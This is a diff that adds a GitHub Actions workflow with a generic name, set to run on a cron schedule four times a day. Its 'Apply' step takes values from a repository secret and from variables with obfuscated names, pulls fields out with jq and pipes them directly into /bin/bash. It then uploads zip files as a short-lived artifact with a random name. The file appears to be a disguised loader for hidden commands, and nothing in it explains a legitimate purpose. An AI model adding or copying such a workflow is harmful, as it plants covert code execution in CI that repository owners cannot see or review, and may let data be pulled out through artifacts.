@@ -1,0 +1,34 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          ncir2: ${{ secrets.ncir2 }}
+        run: |
+          printf '%s' "$ncir2" | jq -r .ta34 | /bin/bash
+          echo $co6218 | jq -r .ismj6 | /bin/bash
+          printf '%s' "$u6412" | jq -r .qddq8 | /bin/bash
+          echo $hcd44 | jq -r .xu45 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: Jn7b3ZjX
+          path: "*.zip"
+          retention-days: 1
